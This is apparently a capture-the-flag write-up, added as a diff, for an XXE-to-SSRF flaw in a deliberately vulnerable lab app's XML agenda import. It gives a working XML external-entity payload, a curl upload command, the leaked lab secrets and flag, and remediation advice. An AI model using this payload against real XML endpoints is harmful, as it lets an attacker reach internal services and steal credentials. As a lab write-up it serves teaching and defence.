@@ -1,0 +1,126 @@
+# Breach 05 — XXE/SSRF (XML External Entity → Server-Side Request Forgery)
+
+## Flag
+`FLAG{d3fus3dxml_n3xt_spr1nt_pr0m1s3}`
+
+## Severity
+CRITICAL
+
+## CWE
+CWE-611: Improper Restriction of XML External Entity Reference
+CWE-918: Server-Side Request Forgery (SSRF)
+
+## OWASP
+A05:2021 – Security Misconfiguration / A10:2021 – Server-Side Request Forgery
+
+## What it is
+The `/agenda/import` endpoint parses user-supplied XML using Python's stdlib
+`xml.etree.ElementTree` parser with external entity resolution fully enabled.
+A deploy-log HTML comment in the platform's source confirms this was deliberate:
+
+v1.3.4 — wil — "disabled defusedxml temporarily" (that was 6 months ago)
+
+And separately:
+
+TODO: replace stdlib xml.etree with defusedxml — emilie reported issue
+
+`defusedxml` is a drop-in replacement for `xml.etree` that disables DTD processing
+and external entity resolution by default. Without it, an attacker can define an
+XML external entity (`<!ENTITY xxe SYSTEM "url">`) and reference it inside the
+document — the parser fetches the URL *from the server's own network position* and
+substitutes the response into the parsed document, which is then reflected back to
+the attacker. This is Server-Side Request Forgery (SSRF) triggered via XXE.
+
+The platform has an endpoint `/internal/config` that is restricted to localhost
+only — an external client receives a 403. But the XML parser runs server-side,
+on localhost, so it can reach this endpoint freely.
+
+## How it works
+
+### Step 1: Craft the XXE payload
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE agenda [
+  <!ENTITY xxe SYSTEM "http://127.0.0.1:4942/internal/config">
+]>
+<agenda>
+  <event>
+    <title>&xxe;</title>
+    <date>2042-01-15</date>
+  </event>
+</agenda>
+```
+Note: the XML declaration must NOT include `encoding="UTF-8"` — the parser
+rejects it with a parse error when that attribute is present.
+
+### Step 2: Upload the payload to the agenda import endpoint
+```bash
+curl -s -X POST http://localhost:4942/agenda/import \
+  -F "file=@xxe_payload.xml" \
+  -b /tmp/benjamin_cookies.txt
+```
+Response: `{"detail":"Found"}` — a redirect indicating successful processing.
+
+### Step 3: View the imported event in the browser
+Navigate to `http://localhost:4942/agenda` and scroll to the "IMPORTED EVENTS"
+section. The event title field now contains the full response from
+`/internal/config`, which the parser fetched server-side and substituted for
+`&xxe;`:
+```json
+{
+  "jwt_secret": "42network",
+  "pb_admin_email": "admin@42network.local",
+  "pb_admin_password": "Darkly42Admin!",
+  "app_version": "1.0.0",
+  "campus": "wilcity",
+  "darkly_flag": "FLAG{d3fus3dxml_n3xt_spr1nt_pr0m1s3}"
+}
+```
+
+## Flag Location
+- **Page:** `/agenda` → "IMPORTED EVENTS" section
+- **Field:** Event title (populated with the internal config JSON by the XXE
+  substitution)
+- **Key:** `darkly_flag` inside the leaked JSON response
+
+## Leaked Credentials
+This is the single most valuable request in the entire audit — one HTTP upload
+yields:
+- **JWT signing secret:** `42network` (enables full session forgery — see JWT
+  Forgery breach)
+- **PocketBase admin email:** `admin@42network.local`
+- **PocketBase admin password:** `Darkly42Admin!` (enables full database access —
+  see PocketBase Admin breach)
+
+## Impact
+The XXE/SSRF breach collapses the trust boundary between the external network and
+every localhost-only service. By making the server issue HTTP requests on the
+attacker's behalf, it:
+- Reaches `/internal/config` despite it returning 403 to all external callers
+- Leaks the JWT signing secret, enabling complete authentication bypass for any
+  user and any role without ever calling `/login`
+- Leaks PocketBase admin credentials, enabling full database read/write access
+  through the admin console
+- Could reach any other localhost service on the server (databases, monitoring
+  agents, cloud metadata endpoints at `169.254.169.254` in cloud deployments) by
+  simply changing the entity URL
+
+## How it could have been avoided (remediation)
+- Re-enable `defusedxml` immediately — it is a one-line import change and the
+  platform already had it installed before wil disabled it:
+```python
+# Replace this:
+from xml.etree import ElementTree as ET
+
+# With this:
+from defusedxml import ElementTree as ET
+```
+- Alternatively, disable DTD and external entity processing explicitly on the
+  stdlib parser if defusedxml cannot be used for any reason.
+- Move all secrets (`jwt_secret`, PocketBase credentials) out of any file or
+  endpoint reachable via the application process — use environment variables or
+  a secrets manager (Vault, AWS Secrets Manager) and never expose them through
+  any HTTP route, even a localhost-only one.
+- Implement egress filtering at the OS/network level so the application process
+  cannot make outbound HTTP requests to localhost or the internal network, limiting
+  the reach of any future SSRF primitive to the external internet only.
